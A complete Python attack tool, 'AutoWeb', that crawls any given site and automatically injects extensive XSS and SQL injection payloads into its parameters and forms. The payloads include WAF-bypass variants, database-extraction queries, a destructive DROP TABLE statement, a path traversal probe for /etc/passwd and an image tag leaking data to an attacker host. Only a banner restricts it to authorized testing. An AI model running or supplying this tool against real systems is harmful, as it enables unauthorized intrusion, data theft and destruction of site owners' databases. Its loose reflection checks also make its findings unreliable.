#!/usr/bin/env python3
"""
AutoWeb - Advanced XSS & SQLi Scanner (v2.1 - Bug Fixed)
For authorized security testing only.
"""

import requests
import re
import urllib.parse
import base64
import hashlib
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Set, List, Tuple, Optional, Dict
import argparse
import sys
import time
from requests.exceptions import RequestException, Timeout, ConnectionError

# ────────────────────────────────────────
# XSS PAYLOADS - Comprehensive Set
# ────────────────────────────────────────

XSS_PAYLOADS_BASIC = [
    # ── Most basic / low-hanging fruit ──
    "<script>alert(1)</script>",
    "<script>alert('xss')</script>",
    "<script>confirm(1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    # ── Simple tag based ──
    "<img src=x onerror=alert(1)>",
    "<img src='x' onerror=alert(1)>",
    "<img src=x onerror=prompt(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    # ── Simple attribute breakouts ──
    "\" onmouseover=alert(1) x=\"",
    "' onmouseover=alert(1) x='",
    "\" autofocus onfocus=alert(1) x=\"",
    "' autofocus onfocus=alert(1) x='",
    "\" onclick=alert(1) x=\"",
    "' onclick=alert(1) x='",
    # ── URL / protocol handlers ──
    "javascript:alert(1)",
    "\"javascript:alert(1)\"",
    "<a href=javascript:alert(1)>click</a>",
    # ── Unclosed tags ──
    "<iframe src=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    # ── Encoded basic ──
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%253Cscript%253Ealert(1)%253C/script%253E",
]

XSS_PAYLOADS_ADVANCED = [
    # ── Context-aware / polyglot ──
    "\"';--><img src=x onerror=alert(1)>",
    "\" autofocus onfocus=\"alert(1)",
    "{{constructor.constructor('alert(1)')()}}",
    # ── WAF bypass: broken tags ──
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<script>eval('al'+'ert(1)')</script>",
    # ── WAF bypass: encoding ──
    "<script>\\u0061lert(1)</script>",
    "<img src=x onerror=\\u0061lert(1)>",
    "<svg><script>alert&#x28;1&#x29;</script></svg>",
    # ── WAF bypass: whitespace / comments ──
    "<scr\\tipt>alert(1)</sc\\rippt>",
    "<scr<!-->ipt>alert(1)</scr<!-->ipt>",
    "<script>/**/alert(1)/**/</script>",
    # ── WAF bypass: eval alternatives ──
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
    "<script>Function('alert(1)')()</script>",
    "<script>setTimeout('alert(1)')</script>",
    "<script>new Function`alert\\1401\\140```</script>",
    "<script>[].constructor.constructor('alert(1)')()</script>",
    # ── fromCharCode ──
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    # ── SVG deeper ──
    "<svg><animatetransform onbegin=alert(1)>",
    "<svg><animate onbegin=alert(1)>",
    # ── CSS / expression ──
    "<style>body{background-image:url(javascript:alert(1))}</style>",
    "<img src=\"http://attacker.com/leak?data=",
    # ── Template / Angular ──
    "{{1+1}}",
    "${alert(1)}",
    "<script type=module>alert(1)</script>",
]

ALL_XSS_PAYLOADS = XSS_PAYLOADS_BASIC + XSS_PAYLOADS_ADVANCED

# ────────────────────────────────────────
# SQLi PAYLOADS - Comprehensive Set
# ────────────────────────────────────────

SQLI_PAYLOADS_BASIC = [
    # ── Most basic / low-hanging fruit ──
    "'",
    "\"",
    "' --",
    "' #",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "\" OR \"1\"=\"1",
    "\" OR \"1\"=\"1\" --",
    "OR 1=1",
    "OR 1=1 --",
    "' OR 1=1 --",
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    # ── Admin bypass ──
    "admin' --",
    "admin' OR '1'='1",
    "' UNION SELECT * FROM users --",
    "' UNION SELECT 1 --",
    # ── Numeric ──
    "1 OR 1=1",
    "1 AND 1=1",
    "1 AND 1=2",
    # ── Comment variations ──
    "'--",
    "'#",
    "')--",
    "') OR ('1'='1",
]

SQLI_PAYLOADS_ADVANCED = [
    # ── Error-based (MySQL) ──
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
    # ── Error-based (PostgreSQL) ──
    "' AND CAST((SELECT version()) AS INTEGER)--",
    # ── Error-based (MSSQL) ──
    "' AND 1=CONVERT(INT, (SELECT @@version))--",
    # ── UNION-based (column enumeration) ──
    "' UNION SELECT 1--",
    "' UNION SELECT 1,2--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT 1,2,3,4--",
    "' UNION SELECT 1,2,3,4,5--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    # ── UNION version / db extraction ──
    "' UNION SELECT @@version,2,3--",
    "' UNION SELECT database(),2,3--",
    "' UNION SELECT user(),2,3--",
    "' UNION SELECT table_name,2,3 FROM information_schema.tables--",
    # ── Boolean-based / blind ──
    "' AND 1=1--",
    "' AND 1=2--",
    "' OR 1=1--",
    "' OR 1=2--",
    "1' AND '1'='1",
    "1' AND '1'='2",
    # ── Time-based (MySQL) ──
    "' OR SLEEP(3)--",
    "' OR SLEEP(5)--",
    "' AND SLEEP(3)--",
    "' OR BENCHMARK(5000000,MD5('test'))--",
    # ── Time-based (PostgreSQL) ──
    "' OR (SELECT pg_sleep(3))--",
    "' AND (SELECT pg_sleep(3))--",
    # ── Time-based (MSSQL) ──
    "' WAITFOR DELAY '0:0:3'--",
    "' WAITFOR DELAY '0:0:5'--",
    "1'; WAITFOR DELAY '0:0:3'--",
    # ── Time-based (Oracle) ──
    "' OR DBMS_LOCK.SLEEP(3)--",
    # ── Stacked queries ──
    "'; DROP TABLE users--",
    # ── WAF bypass: encoding / operators ──
    "%27%20OR%20%271%27%3D%271",
    "'/**/OR/**/'1'='1",
    "'||'1'='1",
    "' OR 1 LIKE 1--",
    "' OR 1 IN (1)--",
    "' OR 1 BETWEEN 0 AND 2--",
    # ── WAF bypass: hex / char ──
    "' OR 1=0x1--",
    "' OR 1=CHAR(49)--",
    "' OR 1=CHR(49)--",
    # ── WAF bypass: case variation ──
    "' oR '1'='1",
    "' UNIoN SELECT 1,2,3 --",
    "' sLeEp(3) --",
    # ── NoSQL injection ──
    "' || '1'=='1",
]

ALL_SQLI_PAYLOADS = SQLI_PAYLOADS_BASIC + SQLI_PAYLOADS_ADVANCED

# ────────────────────────────────────────
# SQL injection error / indicator patterns
# ────────────────────────────────────────

SQLI_ERROR_INDICATORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch",
    "mysql_error",
    "pg_query",
    "pg_last_error",
    "sqlite",
    "sql error",
    "sql syntax",
    "unclosed quotation mark",
    "incorrect syntax",
    "odbc driver",
    "sql server",
    "microsoft ole db",
    "ora-[0-9]{4,6}",
    "ora-[0-9]",
    "quoted string not properly terminated",
    "unexpected end of sql command",
    "syntax error",
    "division by zero",
    "column count doesn't match",
    "unknown column",
    "unknown table",
    "table doesn't exist",
    "microsoft ole db",
    "conversion failed",
    "unclosed quotation",
    "jdbc",
    "com.mysql",
    "org.postgresql",
]

# ────────────────────────────────────────
# WAF Detection
# ────────────────────────────────────────

WAF_DETECTION_PAYLOADS = [
    "1' OR '1'='1",
    "<script>alert(1)</script>",
    "' UNION SELECT * FROM information_schema.tables--",
    "../etc/passwd",
    "'; DROP TABLE users--",
    "<img src=x onerror=alert(1)>",
]

WAF_SIGNATURES = {
    'Cloudflare': ['cloudflare-nginx', '__cfduid', 'cf-ray', 'cf-request-id'],
    'ModSecurity': ['mod_security', 'modsecurity', 'No Vary Cookie'],
    'AWS WAF': ['x-amzn-RequestId', 'x-amzn-ErrorType', 'AWSALB'],
    'F5 BIG-IP': ['BigIP', 'F5', 'TS01'],
    'Akamai': ['akamai', 'akamaized', 'AkamaiGHost'],
    'Imperva / Incapsula': ['incapsula', 'X-Iinfo', 'visid_incap'],
    'Sucuri / CloudProxy': ['sucuri', 'cloudproxy', 'Sucuri/Cloudproxy'],
    'Barracuda': ['barracuda', 'BarracudaNetworks'],
    'Wordfence': ['wordfence', 'WFWAF'],
    'Fortinet': ['fortiwaf', 'FortiWeb'],
    'Radware': ['radware', 'AppWall'],
    'Comodo': ['comodo', 'Comodo_WAF'],
    'Citrix': ['netscaler', 'Citrix'],
    'Varnish': ['varnish', 'X-Varnish'],
}


class AutoWebScanner:
    def __init__(self, target_url: str, threads: int = 5, timeout: int = 10,
                 cookies: Optional[Dict] = None, headers: Optional[Dict] = None,
                 crawl_depth: int = 2, delay: float = 0, xss_advanced: bool = True,
                 sqli_advanced: bool = True):
        self.target_url = target_url.rstrip('/')
        self.visited: Set[str] = set()
        self.forms: List[Dict] = []
        self.xss_vulns: List[Dict] = []
        self.sqli_vulns: List[Dict] = []
        self.threads = threads
        self.timeout = timeout
        self.crawl_depth = crawl_depth
        self.delay = delay
        self.xss_advanced = xss_advanced
        self.sqli_advanced = sqli_advanced
        self.waf_detected = False
        self.waf_name = "None"
        self.session = requests.Session()
        self.session.headers.update(headers or {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                          '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        })
        if cookies:
            self.session.cookies.update(cookies)
        self.domain = urlparse(target_url).netloc

    def get_xss_payloads(self) -> List[str]:
        return XSS_PAYLOADS_BASIC + (XSS_PAYLOADS_ADVANCED if self.xss_advanced else [])

    def get_sqli_payloads(self) -> List[str]:
        return SQLI_PAYLOADS_BASIC + (SQLI_PAYLOADS_ADVANCED if self.sqli_advanced else [])

    # ────────────────────────────────────────
    # WAF Detection
    # ────────────────────────────────────────

    def detect_waf(self) -> str:
        print("[*] Checking for WAF/IPS...")
        for payload in WAF_DETECTION_PAYLOADS:
            try:
                params = {'test': payload}
                r = self.session.get(
                    self.target_url, params=params, timeout=self.timeout
                )
                for waf_name, sigs in WAF_SIGNATURES.items():
                    for sig in sigs:
                        if sig.lower() in str(r.headers).lower():
                            self.waf_detected = True
                            self.waf_name = waf_name
                            result = f"[!] WAF Detected: {waf_name} (via header signature: {sig})"
                            print(result)
                            return result
            except Exception:
                continue

        # Check status code change
        try:
            clean_r = self.session.get(self.target_url, timeout=self.timeout)
            for payload in WAF_DETECTION_PAYLOADS[:3]:
                dirty_r = self.session.get(
                    self.target_url,
                    params={'q': payload},
                    timeout=self.timeout
                )
                if dirty_r.status_code in [403, 406, 429, 503] and clean_r.status_code == 200:
                    self.waf_detected = True
                    self.waf_name = f"Status-based"
                    result = f"[!] WAF/IPS Detected: {self.waf_name}"
                    print(result)
                    return result
        except Exception:
            pass

        result = "[*] No WAF detected or unable to determine."
        print(result)
        return result

    # ────────────────────────────────────────
    # Crawling
    # ────────────────────────────────────────

    def extract_links(self, html: str, base_url: str) -> Set[str]:
        links = set()
        soup = BeautifulSoup(html, 'html.parser')

        for tag in soup.find_all(['a', 'link', 'area']):
            href = tag.get('href')
            if href:
                full_url = urljoin(base_url, href)
                parsed = urlparse(full_url)
                if parsed.netloc == self.domain and parsed.scheme.startswith('http'):
                    clean = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    links.add(clean.rstrip('/'))

        for form in soup.find_all('form'):
            action = form.get('action')
            if action:
                full_url = urljoin(base_url, action)
                parsed = urlparse(full_url)
                if parsed.netloc == self.domain:
                    links.add(f"{parsed.scheme}://{parsed.netloc}{parsed.path}".rstrip('/'))

        return links

    def extract_forms(self, html: str, base_url: str) -> List[Dict]:
        forms = []
        soup = BeautifulSoup(html, 'html.parser')

        for form in soup.find_all('form'):
            action = form.get('action')
            method = form.get('method', 'get').lower()
            form_url = urljoin(base_url, action) if action else base_url

            inputs = []
            for inp in form.find_all(['input', 'textarea', 'select']):
                input_name = inp.get('name')
                input_type = inp.get('type', 'text').lower()
                if input_name:
                    inputs.append({
                        'name': input_name,
                        'type': input_type,
                        'value': inp.get('value', ''),
                    })

            if not inputs:
                continue

            forms.append({
                'url': form_url,
                'method': method,
                'inputs': inputs,
            })

        return forms

    def extract_url_params(self, url: str) -> List[str]:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        return list(params.keys())

    def crawl(self, url: str, depth: int = 0):
        if depth > self.crawl_depth or url in self.visited:
            return
        self.visited.add(url)

        try:
            r = self.session.get(url, timeout=self.timeout)
            if r.status_code != 200 or 'text/html' not in r.headers.get('Content-Type', ''):
                return

            html = r.text

            page_forms = self.extract_forms(html, url)
            if page_forms:
                print(f"  [Forms] Found {len(page_forms)} form(s) on {url}")
                self.forms.extend(page_forms)

            params = self.extract_url_params(url)
            if params:
                print(f"  [Params] Found {len(params)} parameter(s) on {url}: {params}")

            if depth < self.crawl_depth:
                links = self.extract_links(html, url)
                for link in links:
                    if link not in self.visited:
                        self.crawl(link, depth + 1)
                        if self.delay:
                            time.sleep(self.delay)

        except Exception as e:
            print(f"  [!] Crawl error on {url}: {str(e)[:80]}")

    # ────────────────────────────────────────
    # XSS Testing
    # ────────────────────────────────────────

    def is_payload_reflected(self, payload: str, response_text: str) -> bool:
        if payload in response_text:
            return True
        if urllib.parse.quote(payload, safe='') in response_text:
            return True
        if urllib.parse.quote(payload) in response_text:
            return True
        if payload.replace('<', '&lt;').replace('>', '&gt;') in response_text:
            return True
        if payload.replace('"', '&quot;') in response_text:
            return True
        if payload.replace("'", '&#39;') in response_text:
            return True
        double = urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
        if double in response_text:
            return True
        unique_fragments = [
            'onerror=', 'onload=', 'onfocus=', 'onmouseover=',
            'javascript:', 'src=x', 'svg', 'autofocus',
        ]
        for frag in unique_fragments:
            if frag in payload and frag in response_text:
                return True
        return False

    def test_xss_reflected(self, url: str, param: str) -> Optional[Dict]:
        for payload in self.get_xss_payloads():
            try:
                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [payload]

                new_query = urllib.parse.urlencode(params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

                r = self.session.get(test_url, timeout=self.timeout)

                if self.is_payload_reflected(payload, r.text):
                    return {
                        'type': 'XSS (Reflected)',
                        'url': test_url,
                        'parameter': param,
                        'payload': payload[:200],
                    }

                if self.delay:
                    time.sleep(self.delay)

            except Exception:
                continue
        return None

    def test_xss_form(self, form: Dict) -> List[Dict]:
        findings = []
        url = form['url']
        method = form['method']

        for inp in form['inputs']:
            if inp['type'] in ['submit', 'button', 'reset', 'image']:
                continue

            for payload in self.get_xss_payloads():
                try:
                    form_data = {}
                    for other_inp in form['inputs']:
                        if other_inp['name'] == inp['name']:
                            form_data[other_inp['name']] = payload
                        elif other_inp['type'] in ['submit', 'button', 'reset']:
                            continue
                        else:
                            form_data[other_inp['name']] = other_inp.get('value', 'test')

                    if method == 'post':
                        r = self.session.post(url, data=form_data, timeout=self.timeout)
                    else:
                        r = self.session.get(url, params=form_data, timeout=self.timeout)

                    if self.is_payload_reflected(payload, r.text):
                        findings.append({
                            'type': 'XSS (Form)',
                            'url': url,
                            'parameter': inp['name'],
                            'payload': payload[:200],
                            'method': method.upper(),
                        })
                        break

                    if self.delay:
                        time.sleep(self.delay)

                except Exception:
                    continue
        return findings

    def scan_xss(self):
        """BUG FIXED - payloads_count defined before conditional blocks"""
        print("\n[===== XSS SCAN =====]")
        all_findings = []
        payloads_count = len(self.get_xss_payloads())  # ← FIX: moved up here

        # 1) Test URL parameters
        param_tasks = []
        for url in list(self.visited):
            params = self.extract_url_params(url)
            for param in params:
                param_tasks.append((url, param))

        base_params = self.extract_url_params(self.target_url)
        for param in base_params:
            if (self.target_url, param) not in param_tasks:
                param_tasks.append((self.target_url, param))

        if param_tasks:
            total = len(param_tasks)
            print(f"[*] Testing {total} URL parameter(s) with {payloads_count} XSS payloads each...")
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {
                    executor.submit(self.test_xss_reflected, url, param): (url, param)
                    for url, param in param_tasks
                }
                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        all_findings.append(result)
                        print(f"  [XSS FOUND] {result['parameter']} @ {result['url'][:100]}")
                        print(f"    Payload: {result['payload'][:120]}")

        # 2) Test forms
        if self.forms:
            print(f"[*] Testing {len(self.forms)} form(s) with {payloads_count} XSS payloads each...")
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {executor.submit(self.test_xss_form, form): form for form in self.forms}
                for future in as_completed(futures):
                    results = future.result()
                    for result in results:
                        all_findings.append(result)
                        print(f"  [XSS FOUND] {result['parameter']} ({result['method']}) @ {result['url'][:100]}")
                        print(f"    Payload: {result['payload'][:120]}")

        self.xss_vulns = all_findings
        if not all_findings:
            print("[*] No XSS vulnerabilities found.")
        return all_findings

    # ────────────────────────────────────────
    # SQLi Testing
    # ────────────────────────────────────────

    def has_sqli_error(self, response_text: str) -> bool:
        for pattern in SQLI_ERROR_INDICATORS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

    def test_sqli_reflected(self, url: str, param: str) -> Optional[Dict]:
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            baseline_r = self.session.get(url, timeout=self.timeout)
            baseline_length = len(baseline_r.text)
            baseline_status = baseline_r.status_code
        except Exception:
            return None

        for payload in self.get_sqli_payloads():
            try:
                test_params = params.copy()
                test_params[param] = [payload]
                new_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

                start_time = time.time()
                r = self.session.get(test_url, timeout=self.timeout + 2)
                elapsed = time.time() - start_time

                # Error-based
                if self.has_sqli_error(r.text):
                    finding = {
                        'type': 'SQLi (Error-based)',
                        'url': test_url,
                        'parameter': param,
                        'payload': payload[:200],
                    }
                    for pattern in SQLI_ERROR_INDICATORS:
                        match = re.search(pattern, r.text, re.IGNORECASE)
                        if match:
                            start = max(0, match.start() - 30)
                            end = min(len(r.text), match.end() + 30)
                            finding['detail'] = f"Error: ...{r.text[start:end]}..."
                            break
                    return finding

                # Boolean-based: status change
                if r.status_code != baseline_status:
                    if any(x in payload.lower() for x in ['or', 'and', 'union', 'sleep', 'waitfor']):
                        return {
                            'type': 'SQLi (Boolean-based - status)',
                            'url': test_url,
                            'parameter': param,
                            'payload': payload[:200],
                            'detail': f'Status {baseline_status} → {r.status_code}',
                        }

                # Boolean-based: content diff > 30%
                if baseline_length > 0:
                    content_diff = abs(len(r.text) - baseline_length)
                    if content_diff > baseline_length * 0.3:
                        if any(x in payload.lower() for x in ['or', 'and', 'union', 'order by']):
                            return {
                                'type': 'SQLi (Boolean-based - content)',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload[:200],
                                'detail': f'Size: {baseline_length} → {len(r.text)} (diff: {content_diff})',
                            }

                # Time-based: slow response
                if elapsed >= self.timeout * 0.8:
                    if any(x in payload.lower() for x in ['sleep', 'waitfor', 'benchmark', 'pg_sleep', 'dbms_lock']):
                        return {
                            'type': 'SQLi (Time-based)',
                            'url': test_url,
                            'parameter': param,
                            'payload': payload[:200],
                            'detail': f'Response: {elapsed:.2f}s',
                        }

                if self.delay:
                    time.sleep(self.delay)

            except Timeout:
                if any(x in payload.lower() for x in ['sleep', 'waitfor', 'benchmark', 'pg_sleep', 'dbms_lock']):
                    return {
                        'type': 'SQLi (Time-based - timeout)',
                        'url': url,
                        'parameter': param,
                        'payload': payload[:200],
                        'detail': 'Request timed out',
                    }
            except Exception:
                continue

        return None

    def test_sqli_form(self, form: Dict) -> List[Dict]:
        findings = []
        url = form['url']
        method = form['method']

        try:
            baseline_data = {}
            for inp in form['inputs']:
                if inp['type'] not in ['submit', 'button', 'reset', 'image']:
                    baseline_data[inp['name']] = inp.get('value', '1')

            if method == 'post':
                baseline_r = self.session.post(url, data=baseline_data, timeout=self.timeout)
            else:
                baseline_r = self.session.get(url, params=baseline_data, timeout=self.timeout)
            baseline_length = len(baseline_r.text)
            baseline_status = baseline_r.status_code
        except Exception:
            baseline_length = 0
            baseline_status = 200

        for inp in form['inputs']:
            if inp['type'] in ['submit', 'button', 'reset', 'image', 'hidden']:
                continue

            for payload in self.get_sqli_payloads():
                try:
                    form_data = {}
                    for other_inp in form['inputs']:
                        if other_inp['name'] == inp['name']:
                            form_data[other_inp['name']] = payload
                        elif other_inp['type'] in ['submit', 'button', 'reset']:
                            continue
                        else:
                            form_data[other_inp['name']] = other_inp.get('value', 'test')

                    start_time = time.time()
                    if method == 'post':
                        r = self.session.post(url, data=form_data, timeout=self.timeout + 2)
                    else:
                        r = self.session.get(url, params=form_data, timeout=self.timeout + 2)
                    elapsed = time.time() - start_time

                    if self.has_sqli_error(r.text):
                        findings.append({
                            'type': 'SQLi (Error - Form)',
                            'url': url,
                            'parameter': inp['name'],
                            'payload': payload[:200],
                            'method': method.upper(),
                        })
                        break

                    if baseline_length > 0:
                        content_diff = abs(len(r.text) - baseline_length)
                        if content_diff > baseline_length * 0.3:
                            if any(x in payload.lower() for x in ['or', 'and', 'union']):
                                findings.append({
                                    'type': 'SQLi (Boolean - Form)',
                                    'url': url,
                                    'parameter': inp['name'],
                                    'payload': payload[:200],
                                    'method': method.upper(),
                                })
                                break

                    if elapsed >= self.timeout * 0.8:
                        if any(x in payload.lower() for x in ['sleep', 'waitfor', 'benchmark', 'pg_sleep', 'dbms_lock']):
                            findings.append({
                                'type': 'SQLi (Time - Form)',
                                'url': url,
                                'parameter': inp['name'],
                                'payload': payload[:200],
                                'method': method.upper(),
                                'detail': f'{elapsed:.2f}s',
                            })
                            break

                    if self.delay:
                        time.sleep(self.delay)

                except Timeout:
                    if any(x in payload.lower() for x in ['sleep', 'waitfor', 'benchmark', 'pg_sleep', 'dbms_lock']):
                        findings.append({
                            'type': 'SQLi (Time - Form)',
                            'url': url,
                            'parameter': inp['name'],
                            'payload': payload[:200],
                            'method': method.upper(),
                            'detail': 'Timed out',
                        })
                        break
                except Exception:
                    continue

        return findings

    def scan_sqli(self):
        """BUG FIXED - payloads_count defined before conditional blocks"""
        print("\n[===== SQLi SCAN =====]")
        all_findings = []
        payloads_count = len(self.get_sqli_payloads())  # ← FIX: moved up here

        # 1) Test URL parameters
        param_tasks = []
        for url in list(self.visited):
            params = self.extract_url_params(url)
            for param in params:
                param_tasks.append((url, param))

        base_params = self.extract_url_params(self.target_url)
        for param in base_params:
            if (self.target_url, param) not in param_tasks:
                param_tasks.append((self.target_url, param))

        if param_tasks:
            total = len(param_tasks)
            print(f"[*] Testing {total} URL parameter(s) with {payloads_count} SQLi payloads each...")
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {
                    executor.submit(self.test_sqli_reflected, url, param): (url, param)
                    for url, param in param_tasks
                }
                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        all_findings.append(result)
                        f_type = result['type'].split('(')[0].strip()
                        print(f"  [SQLi FOUND] [{f_type}] {result['parameter']} @ {result['url'][:80]}")
                        print(f"    Payload: {result['payload'][:120]}")

        # 2) Test forms
        if self.forms:
            print(f"[*] Testing {len(self.forms)} form(s) with {payloads_count} SQLi payloads each...")
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {executor.submit(self.test_sqli_form, form): form for form in self.forms}
                for future in as_completed(futures):
                    results = future.result()
                    for result in results:
                        all_findings.append(result)
                        print(f"  [SQLi FOUND] [{result['type'].split('(')[0].strip()}] {result['parameter']} @ {result['url'][:80]}")
                        print(f"    Payload: {result['payload'][:120]}")

        self.sqli_vulns = all_findings
        if not all_findings:
            print("[*] No SQL injection vulnerabilities found.")
        return all_findings

    # ────────────────────────────────────────
    # Reporting
    # ────────────────────────────────────────

    def generate_report(self):
        print("\n" + "=" * 70)
        print("                     FINAL REPORT")
        print("=" * 70)

        print(f"\nTarget:      {self.target_url}")
        print(f"Domain:      {self.domain}")
        print(f"Pages crawled: {len(self.visited)}")
        print(f"Forms discovered: {len(self.forms)}")
        print(f"WAF Detected: {self.waf_detected} ({self.waf_name})")
        print(f"XSS Payloads tested: {len(self.get_xss_payloads())}")
        print(f"SQLi Payloads tested: {len(self.get_sqli_payloads())}")

        print("\n" + "-" * 70)
        print("XSS VULNERABILITIES")
        print("-" * 70)
        if self.xss_vulns:
            for i, vuln in enumerate(self.xss_vulns, 1):
                print(f"\n  #{i}")
                print(f"  Type:      {vuln['type']}")
                print(f"  URL:       {vuln['url']}")
                print(f"  Parameter: {vuln['parameter']}")
                print(f"  Payload:   {vuln['payload']}")
                if 'method' in vuln:
                    print(f"  Method:    {vuln['method']}")
        else:
            print("\n  None found.")

        print("\n" + "-" * 70)
        print("SQL INJECTION VULNERABILITIES")
        print("-" * 70)
        if self.sqli_vulns:
            for i, vuln in enumerate(self.sqli_vulns, 1):
                print(f"\n  #{i}")
                print(f"  Type:      {vuln['type']}")
                print(f"  URL:       {vuln['url']}")
                print(f"  Parameter: {vuln['parameter']}")
                print(f"  Payload:   {vuln['payload']}")
                if 'method' in vuln:
                    print(f"  Method:    {vuln['method']}")
                if 'detail' in vuln:
                    print(f"  Detail:    {vuln['detail']}")
        else:
            print("\n  None found.")

        print("\n" + "=" * 70)
        print("                END OF REPORT")
        print("=" * 70)


# ────────────────────────────────────────
# Main
# ────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="AutoWeb v2.1 - Advanced XSS & SQLi Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('--crawl-depth', type=int, default=2)
    parser.add_argument('--threads', type=int, default=5)
    parser.add_argument('--timeout', type=int, default=10)
    parser.add_argument('--delay', type=float, default=0)
    parser.add_argument('--xss-only', action='store_true')
    parser.add_argument('--sqli-only', action='store_true')
    parser.add_argument('--no-advanced', action='store_true')
    parser.add_argument('--cookie', type=str)
    parser.add_argument('--header', type=str, action='append')
    parser.add_argument('--no-waf', action='store_true')

    args = parser.parse_args()

    cookies = {}
    if args.cookie:
        for pair in args.cookie.split(';'):
            if '=' in pair:
                k, v = pair.strip().split('=', 1)
                cookies[k] = v

    headers = {}
    if args.header:
        for h in args.header:
            if ':' in h:
                k, v = h.split(':', 1)
                headers[k.strip()] = v.strip()

    print(r"""
     ___       _        ____ _    _______        __
    / _ \__ _ | |_  ___/ ___| |  |_   _\ \      / /
   | | |/ _` || __|/ _ \ |   | |    | |  \ \ /\ / / 
   | |_| (_| || |_|  __/ |___| |___ | |   \ V  V /  
    \___/\__,_| \__|\___|\____|_____|_|    \_/\_/   
                                                     
   AutoWeb v2.1 - XSS & SQLi Scanner (Bug Fixed)
   Authorized Security Testing Only
    """)

    scanner = AutoWebScanner(
        target_url=args.url,
        threads=args.threads,
        timeout=args.timeout,
        cookies=cookies,
        headers=headers,
        crawl_depth=args.crawl_depth,
        delay=args.delay,
        xss_advanced=not args.no_advanced,
        sqli_advanced=not args.no_advanced,
    )

    if not args.no_waf:
        print(scanner.detect_waf())
        print()

    print("[*] Starting crawl...")
    scanner.crawl(args.url)
    print(f"[*] Crawl complete. Visited {len(scanner.visited)} page(s), "
          f"found {len(scanner.forms)} form(s).")

    if not args.sqli_only:
        scanner.scan_xss()
    if not args.xss_only:
        scanner.scan_sqli()

    scanner.generate_report()


if __name__ == '__main__':
    main()
